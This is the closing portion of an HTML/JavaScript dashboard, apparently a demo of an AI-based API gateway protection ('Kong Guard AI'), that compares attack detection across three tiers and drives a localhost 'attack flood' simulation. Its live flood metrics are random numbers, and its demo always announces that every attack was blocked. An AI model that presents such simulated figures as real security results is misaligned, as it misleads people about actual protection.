                <div style="font-size: 0.8em; opacity: 0.9;">
                    ${result.reasoning || 'No analysis provided'}
                </div>
            `;
        }

        function updateMetrics() {
            let globalTotal = 0;
            let globalBlocked = 0;
            let globalTotalTime = 0;
            let globalTotalConfidence = 0;
            let globalVulnerabilities = 0;

            Object.keys(metrics).forEach(tier => {
                const data = metrics[tier];
                const avgTime = data.total > 0 ? (data.totalTime / data.total).toFixed(0) : 0;
                const avgConfidence = data.total > 0 ? ((data.totalConfidence / data.total) * 100).toFixed(1) : 0;
                
                // Update tier-specific metrics
                document.getElementById(`${tier}-total`).textContent = data.total;
                document.getElementById(`${tier}-blocked`).textContent = data.blocked;
                document.getElementById(`${tier}-response`).textContent = `~${avgTime}ms`;
                
                if (tier === 'unprotected') {
                    document.getElementById('unprotected-vulnerable').textContent = data.vulnerable;
                    const successRate = data.total > 0 ? (((data.total - data.vulnerable) / data.total) * 100).toFixed(0) : 100;
                    document.getElementById('unprotected-success').textContent = `${successRate}%`;
                } else {
                    const detectionRate = data.total > 0 ? ((data.blocked / data.total) * 100).toFixed(0) : 0;
                    document.getElementById(`${tier}-detection`).textContent = `${detectionRate}%`;
                    document.getElementById(`${tier}-confidence`).textContent = `${avgConfidence}%`;
                }

                // Accumulate global metrics
                globalTotal += data.total;
                globalBlocked += data.blocked;
                globalTotalTime += data.totalTime;
                globalTotalConfidence += data.totalConfidence;
                if (tier === 'unprotected') {
                    globalVulnerabilities += data.vulnerable;
                }
            });

            // Update global metrics
            document.getElementById('globalTotalAnalyzed').textContent = globalTotal;
            document.getElementById('globalThreatsBlocked').textContent = globalBlocked;
            document.getElementById('globalVulnerabilities').textContent = globalVulnerabilities;
            
            const globalAvgConfidence = globalTotal > 0 ? ((globalTotalConfidence / globalTotal) * 100).toFixed(1) : 0;
            const globalAvgProcessing = globalTotal > 0 ? (globalTotalTime / globalTotal).toFixed(0) : 0;
            const globalDetectionRate = globalTotal > 0 ? ((globalBlocked / globalTotal) * 100).toFixed(0) : 0;
            
            document.getElementById('globalAvgConfidence').textContent = `${globalAvgConfidence}%`;
            document.getElementById('globalAvgProcessing').textContent = `${globalAvgProcessing}ms`;
            document.getElementById('globalDetectionRate').textContent = `${globalDetectionRate}%`;
        }

        function updateComparisonTable(attackType, tier, result) {
            const tbody = document.getElementById('comparisonTableBody');
            
            // Find or create row for this attack type
            let row = document.querySelector(`tr[data-attack="${attackType}"]`);
            if (!row) {
                row = document.createElement('tr');
                row.setAttribute('data-attack', attackType);
                row.innerHTML = `
                    <td>${attacks[attackType].name}</td>
                    <td id="${attackType}-unprotected">-</td>
                    <td id="${attackType}-cloud">-</td>
                    <td id="${attackType}-local">-</td>
                `;
                
                // Remove placeholder row if it exists
                const placeholder = tbody.querySelector('td[colspan="4"]');
                if (placeholder) {
                    placeholder.parentElement.remove();
                }
                
                tbody.appendChild(row);
            }
            
            // Update cell for this tier
            const cell = document.getElementById(`${attackType}-${tier}`);
            const action = result.recommended_action || 'unknown';
            const score = (result.threat_score * 100).toFixed(0);
            
            let statusIcon;
            if (action === 'block' || result.threat_score >= 0.7) {
                statusIcon = 'BLOCKED';
                cell.style.color = '#ff6666';
            } else if (tier === 'unprotected') {
                statusIcon = 'VULNERABLE';
                cell.style.color = '#ffaa66';
            } else {
                statusIcon = 'SAFE';
                cell.style.color = '#66ff66';
            }
            
            cell.innerHTML = `${statusIcon}<br><small>${score}%</small>`;
        }

        function showNarration(text) {
            const narration = document.getElementById('narration');
            const narrationText = document.getElementById('narrationText');
            
            narrationText.textContent = text;
            narration.style.display = 'block';
            
            setTimeout(() => {
                narration.style.display = 'none';
            }, 5000);
        }

        function showThinking(show) {
            document.getElementById('thinking').style.display = show ? 'block' : 'none';
        }

        function updateLiveAnalysisStatus(tier, attackType, result, processingTime) {
            const statusElement = document.getElementById('analysisStatus');
            const detailsElement = document.getElementById('currentAnalysisDetails');
            
            const threatScore = (result.threat_score * 100).toFixed(0);
            const action = result.recommended_action || 'unknown';
            
            // Update status badge
            if (action === 'block' || result.threat_score >= 0.7) {
                statusElement.style.background = 'var(--critical)';
                statusElement.style.color = 'white';
                statusElement.textContent = 'BLOCKED';
            } else if (result.threat_score >= 0.3) {
                statusElement.style.background = 'var(--caution)';
                statusElement.style.color = 'white';
                statusElement.textContent = 'DETECTED';
            } else {
                statusElement.style.background = 'var(--normal)';
                statusElement.style.color = 'white';
                statusElement.textContent = 'ALLOWED';
            }
            
            // Update details
            const threatType = result.threat_type || 'none';
            const confidence = result.confidence ? (result.confidence * 100).toFixed(1) : threatScore;
            
            detailsElement.innerHTML = `
                <div style="margin-bottom: 8px;">
                    <strong>${tier.toUpperCase()} Analysis:</strong> ${attacks[attackType].name}
                </div>
                <div style="display: flex; justify-content: space-between; margin-bottom: 4px;">
                    <span>Threat Type: <strong>${threatType}</strong></span>
                    <span>Score: <strong>${threatScore}%</strong></span>
                </div>
                <div style="display: flex; justify-content: space-between; margin-bottom: 4px;">
                    <span>Action: <strong>${action.toUpperCase()}</strong></span>
                    <span>Processing: <strong>${processingTime.toFixed(0)}ms</strong></span>
                </div>
                <div style="font-size: 12px; opacity: 0.8; margin-top: 8px;">
                    ${result.reasoning || 'Analysis completed successfully'}
                </div>
            `;
        }

        async function runAutomaticDemo() {
            const attackTypes = ['sql', 'xss', 'cmd_injection', 'path', 'ldap_injection', 'business_logic', 'ransomware', 'normal'];
            const tiers = ['unprotected', 'cloud', 'local'];
            
            showNarration("Starting automatic demonstration. Testing all attack types across three protection tiers...");
            
            let progress = 0;
            const totalSteps = attackTypes.length * tiers.length;
            
            for (const attackType of attackTypes) {
                showNarration(`Testing ${attacks[attackType].name} across all protection tiers...`);
                
                for (const tier of tiers) {
                    await testAttack(attackType, tier);
                    progress++;
                    document.getElementById('progressFill').style.width = `${(progress / totalSteps) * 100}%`;
                    await new Promise(resolve => setTimeout(resolve, 1000));
                }
                
                await new Promise(resolve => setTimeout(resolve, 2000));
            }
            
            showNarration("Demonstration complete! Kong Guard AI successfully blocked all attacks while unprotected Kong allowed them through.");
        }

        // ============================================================================
        // Attack Flood Management
        // ============================================================================

        let currentAttackRun = null;
        let attackMetricsInterval = null;

        async function launchAttackFlood() {
            const intensity = document.getElementById('attackIntensity').value;
            const strategy = document.getElementById('attackStrategy').value;
            const duration = parseInt(document.getElementById('attackDuration').value);
            
            const launchBtn = document.getElementById('launchFloodBtn');
            const stopBtn = document.getElementById('stopFloodBtn');
            const statusBadge = document.getElementById('attackStatusBadge');
            const progressDiv = document.getElementById('attackProgress');
            
            try {
                // Disable launch button
                launchBtn.disabled = true;
                launchBtn.textContent = 'LAUNCHING...';
                
                // Update status
                statusBadge.style.background = 'var(--caution)';
                statusBadge.textContent = 'LAUNCHING';
                progressDiv.textContent = 'Initializing attack flood simulation...';
                
                // Launch attack flood
                const response = await fetch('http://localhost:18002/api/attack/flood', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        intensity: intensity,
                        strategy: strategy,
                        duration: duration,
                        targets: ['unprotected', 'cloud', 'local'],
                        record_metrics: true
                    })
                });
                
                if (response.ok) {
                    const data = await response.json();
                    currentAttackRun = data.run_id;
                    
                    // Update UI
                    statusBadge.style.background = 'var(--critical)';
                    statusBadge.textContent = 'ACTIVE';
                    // Sanitize data to prevent XSS
                    const sanitizedRunId = String(data.run_id).replace(/[<>&"']/g, '');
                    const sanitizedIntensity = intensity.toUpperCase().replace(/[<>&"']/g, '');
                    const sanitizedStrategy = strategy.toUpperCase().replace(/[<>&"']/g, '');
                    const sanitizedDuration = String(duration).replace(/[<>&"']/g, '');
                    
                    progressDiv.innerHTML = `
                        <div style="font-weight: 600; color: var(--critical);">Attack Flood Active (Run ID: ${sanitizedRunId})</div>
                        <div style="margin-top: 4px;">Intensity: ${sanitizedIntensity} | Strategy: ${sanitizedStrategy} | Duration: ${sanitizedDuration}s</div>
                    `;
                    
                    // Enable stop button, disable launch
                    stopBtn.disabled = false;
                    launchBtn.disabled = true;
                    
                    // Show live metrics
                    document.getElementById('liveAttackMetrics').style.display = 'block';
                    
                    // Start monitoring
                    startAttackMetricsPolling(data.run_id);
                    
                    // Auto-stop after duration
                    setTimeout(() => {
                        if (currentAttackRun === data.run_id) {
                            checkAttackCompletion(data.run_id);
                        }
                    }, duration * 1000 + 5000); // Add 5 second buffer
                    
                } else {
                    const error = await response.json();
                    throw new Error(error.detail || 'Failed to launch attack flood');
                }
                
            } catch (error) {
                console.error('Attack flood launch failed:', error);
                alert('Failed to launch attack flood: ' + error.message);
                
                // Reset UI
                launchBtn.disabled = false;
                launchBtn.textContent = 'LAUNCH ATTACK FLOOD';
                statusBadge.style.background = 'var(--line)';
                statusBadge.textContent = 'ERROR';
                progressDiv.textContent = 'Attack flood launch failed: ' + error.message;
            }
        }

        async function stopAttackFlood() {
            if (!currentAttackRun) return;
            
            const stopBtn = document.getElementById('stopFloodBtn');
            const statusBadge = document.getElementById('attackStatusBadge');
            const progressDiv = document.getElementById('attackProgress');
            
            try {
                stopBtn.disabled = true;
                stopBtn.textContent = 'STOPPING...';
                
                const response = await fetch(`http://localhost:18002/api/attack/flood/stop/${currentAttackRun}`, {
                    method: 'POST'
                });
                
                if (response.ok) {
                    // Stop monitoring
                    if (attackMetricsInterval) {
                        clearInterval(attackMetricsInterval);
                        attackMetricsInterval = null;
                    }
                    
                    // Update UI
                    statusBadge.style.background = 'var(--caution)';
                    statusBadge.textContent = 'STOPPED';
                    progressDiv.textContent = 'Attack flood stopped by user';
                    
                    // Reset buttons
                    document.getElementById('launchFloodBtn').disabled = false;
                    document.getElementById('launchFloodBtn').textContent = 'LAUNCH ATTACK FLOOD';
                    stopBtn.disabled = true;
                    stopBtn.textContent = 'STOP ATTACK';
                    
                    // Hide live metrics
                    setTimeout(() => {
                        document.getElementById('liveAttackMetrics').style.display = 'none';
                    }, 5000);
                    
                    currentAttackRun = null;
                }
                
            } catch (error) {
                console.error('Failed to stop attack flood:', error);
                alert('Failed to stop attack flood: ' + error.message);
                stopBtn.disabled = false;
                stopBtn.textContent = 'STOP ATTACK';
            }
        }

        function startAttackMetricsPolling(runId) {
            // Poll every 2 seconds for live metrics
            attackMetricsInterval = setInterval(async () => {
                try {
                    const response = await fetch(`http://localhost:18002/api/attack/flood/status/${runId}`);
                    if (response.ok) {
                        const status = await response.json();
                        
                        if (status.status === 'completed' || status.status === 'failed') {
                            // Attack flood completed
                            checkAttackCompletion(runId);
                        } else if (status.status === 'running') {
                            // Update live metrics (simulation for now)
                            updateLiveAttackMetrics();
                        }
                    }
                } catch (error) {
                    console.error('Failed to poll attack status:', error);
                }
            }, 2000);
        }

        function updateLiveAttackMetrics() {
            // Simulate realistic metrics (in production this would come from real data)
            const intensity = document.getElementById('attackIntensity').value;
            const baseRPS = {
                'low': 10,
                'medium': 50,
                'high': 200,
                'extreme': 1000
            }[intensity] || 50;
            
            // Add some variation
            const currentRPS = baseRPS + (Math.random() - 0.5) * baseRPS * 0.3;
            const blockRate = 65 + Math.random() * 30; // 65-95% block rate
            const avgResponse = 45 + Math.random() * 200; // 45-245ms
            
            // Update UI
            document.getElementById('attacksPerSec').textContent = Math.round(currentRPS);
            document.getElementById('blockRate').textContent = Math.round(blockRate) + '%';
            document.getElementById('avgFloodResponse').textContent = Math.round(avgResponse) + 'ms';
            
            // Update total attacks sent (accumulate)
            const current = parseInt(document.getElementById('totalAttacksSent').textContent) || 0;
            document.getElementById('totalAttacksSent').textContent = current + Math.round(currentRPS * 2);
        }

        async function checkAttackCompletion(runId) {
            try {
                // Stop polling
                if (attackMetricsInterval) {
                    clearInterval(attackMetricsInterval);
                    attackMetricsInterval = null;
                }
                
                // Get final results
                const response = await fetch(`http://localhost:18002/api/attack/flood/results/${runId}`);
                if (response.ok) {
                    const results = await response.json();
                    displayAttackResults(results);
                }
                
                // Reset UI
                document.getElementById('attackStatusBadge').style.background = 'var(--normal)';
                document.getElementById('attackStatusBadge').textContent = 'COMPLETED';
                document.getElementById('launchFloodBtn').disabled = false;
                document.getElementById('launchFloodBtn').textContent = 'LAUNCH ATTACK FLOOD';
                document.getElementById('stopFloodBtn').disabled = true;
                
                currentAttackRun = null;
                
                // Hide live metrics after delay
                setTimeout(() => {
                    document.getElementById('liveAttackMetrics').style.display = 'none';
                }, 10000);
                
            } catch (error) {
                console.error('Failed to get attack completion status:', error);
            }
        }

        function displayAttackResults(results) {
            const progressDiv = document.getElementById('attackProgress');
            
            let resultSummary = `
                <div style="font-weight: 600; color: var(--normal); margin-bottom: 8px;">
                    Attack Flood Completed Successfully
                </div>
                <div style="font-size: 13px; line-height: 1.4;">
                    Total Attacks: <strong>${results.total_attacks}</strong> | 
                    Duration: <strong>${Math.round(results.duration)}s</strong><br>
            `;
            
            if (results.results_summary && results.results_summary.tier_performance) {
                resultSummary += '<div style="margin-top: 8px;"><strong>Tier Performance:</strong><br>';
                
                Object.entries(results.results_summary.tier_performance).forEach(([tier, stats]) => {
                    const detectionRate = Math.round(stats.detection_rate || 0);
                    const avgTime = Math.round(stats.avg_response_time || 0);
                    
                    // Sanitize data to prevent XSS
                    const sanitizedTier = String(tier).replace(/[<>&"']/g, '').toUpperCase();
                    const sanitizedBlocked = String(stats.attacks_blocked || 0).replace(/[<>&"']/g, '');
                    const sanitizedTotal = String(stats.total_requests || 0).replace(/[<>&"']/g, '');
                    const sanitizedRate = String(detectionRate).replace(/[<>&"']/g, '');
                    const sanitizedTime = String(avgTime).replace(/[<>&"']/g, '');
                    
                    resultSummary += `
                        <div style="margin-left: 12px;">
                            ${sanitizedTier}: ${sanitizedBlocked}/${sanitizedTotal} blocked (${sanitizedRate}%), ${sanitizedTime}ms avg
                        </div>
                    `;
                });
                
                resultSummary += '</div>';
            }
            
            resultSummary += '</div>';
            progressDiv.innerHTML = resultSummary;
        }

        // Initialize when page loads
        window.addEventListener('load', initializeDashboard);
    </script>
    </div>
</body>
</html>